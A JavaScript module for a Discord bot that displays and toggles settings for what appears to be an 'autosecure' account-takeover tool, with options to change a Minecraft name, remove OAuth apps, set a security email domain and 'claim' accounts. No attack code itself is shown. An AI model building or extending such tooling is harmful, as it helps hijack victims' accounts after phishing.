const { ActionRowBuilder } = require("@discordjs/builders")
const { queryParams } = require("../../db/db")
const { ButtonBuilder, ButtonStyle } = require("discord.js")

module.exports = async (username) => {
    let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [username])
    if (settings.length == 0) {
        return {
            embeds: [{
                title: `Error :x:`,
                description: `Couldn't find your embed!`,
                color: 0x00ff00
            }],
            ephemeral: true
        }
    }
    settings = settings[0]
    let fields = [
        {
            name: "Autosecure",
            value: settings.auto_secure ? ":white_check_mark:" : ":x:",
            inline: true
        },
        {
            name: "Change IGN",
            value: settings.change_ign ? ":white_check_mark:" : ":x:",
            inline: true
        },
        {
            name: "Disable Multiplayer",
            value: settings.multiplayer ? ":white_check_mark:" : ":x:",
            inline: true
        },
        {
            name: "OAUTH Apps",
            value: settings.oauthapps ? ":white_check_mark:" : ":x:",
            inline: true
        },
        {
            name: "Claiming",
            value: settings.claiming ? ":white_check_mark:" : ":x:",
            inline: true
        },
        {
            name: "OAUTH Link",
            value: settings.oauth_link ? "```" + settings.oauth_link + "```" : ":x:",
            inline: true
        },
        {
            name: "Secure if no MC",
            value: settings.secureifnomc ? ":white_check_mark:" : ":x:",
            inline: true
        },
        {
            name: "Domain",
            value: settings.domain,
            inline: true
        }
    ]
    let first3Buttons = new ActionRowBuilder()
    let second3Buttons = new ActionRowBuilder()
    let third3Buttons = new ActionRowBuilder()
    let forth3Buttons = new ActionRowBuilder()
    if (settings.auto_secure) {
        first3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|auto_secure|0").setLabel("Autosecure").setEmoji({ name: "⚙️" }).setStyle(ButtonStyle.Danger))
    } else {
        first3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|auto_secure|1").setLabel("Autosecure").setEmoji({ name: "⚙️" }).setStyle(ButtonStyle.Success))
    }

    if (settings.change_ign) {
        first3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|change_ign|0").setLabel("Change IGN").setEmoji({ name: "🏷️" }).setStyle(ButtonStyle.Danger))
    } else {
        first3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|change_ign|1").setLabel("Change IGN").setEmoji({ name: "🏷️" }).setStyle(ButtonStyle.Success))
    }


    if (settings.multiplayer) {
        first3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|multiplayer|0").setLabel("Disable Multiplayer").setEmoji({ name: "🎮" }).setStyle(ButtonStyle.Danger))
    } else {
        first3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|multiplayer|1").setLabel("Disable Multiplayer").setEmoji({ name: "🎮" }).setStyle(ButtonStyle.Success))
    }


    if (settings.oauthapps) {
        second3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|oauthapps|0").setLabel("Remove OAUTH Apps").setEmoji({ name: "🗝️" }).setStyle(ButtonStyle.Danger))
    } else {
        second3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|oauthapps|1").setLabel("Remove OAUTH Apps").setEmoji({ name: "🗝️" }).setStyle(ButtonStyle.Success))
    }
    if (settings.claiming) {
        second3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|claiming|0").setLabel("Claiming").setEmoji({ name: "💼" }).setStyle(ButtonStyle.Danger))
    } else {
        second3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|claiming|1").setLabel("Claiming").setEmoji({ name: "💼" }).setStyle(ButtonStyle.Success))
    }

    second3Buttons.addComponents(new ButtonBuilder().setCustomId("oauthset").setLabel("OAuth Link").setEmoji({ name: "🔗" }).setStyle(ButtonStyle.Primary))

    if (settings.secureifnomc) {
        third3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|secureifnomc|0").setLabel("Secure if no MC").setEmoji({ name: "💼" }).setStyle(ButtonStyle.Danger))
    } else {
        third3Buttons.addComponents(new ButtonBuilder().setCustomId("settings|secureifnomc|1").setLabel("Secure if no MC").setEmoji({ name: "💼" }).setStyle(ButtonStyle.Success))
    }

    third3Buttons.addComponents(new ButtonBuilder().setCustomId("changestatus").setLabel("Bot Status").setEmoji("🤖").setStyle(ButtonStyle.Secondary))
    third3Buttons.addComponents(new ButtonBuilder().setCustomId("emaildomain").setLabel("Security Email Domain").setEmoji({name:"📧"}).setStyle(ButtonStyle.Secondary))
    forth3Buttons.addComponents(new ButtonBuilder().setCustomId("editembeds").setLabel("Edit Embeds").setEmoji("📙").setStyle(ButtonStyle.Secondary))
    // forth3Buttons.addComponents(new ButtonBuilder().setCustomId("editmodals").setLabel("Edit Modals").setEmoji("📙").setStyle(ButtonStyle.Secondary))
    forth3Buttons.addComponents(new ButtonBuilder().setCustomId("editbuttons").setLabel("Edit Buttons").setEmoji("📙").setStyle(ButtonStyle.Secondary))
    return {
        embeds: [{
            title: `Your settings!`,
            // description: description,
            fields: fields,
            color: 0x00ff00,
        }],
        components: [first3Buttons, second3Buttons, third3Buttons, forth3Buttons],
        ephemeral: true
    }
}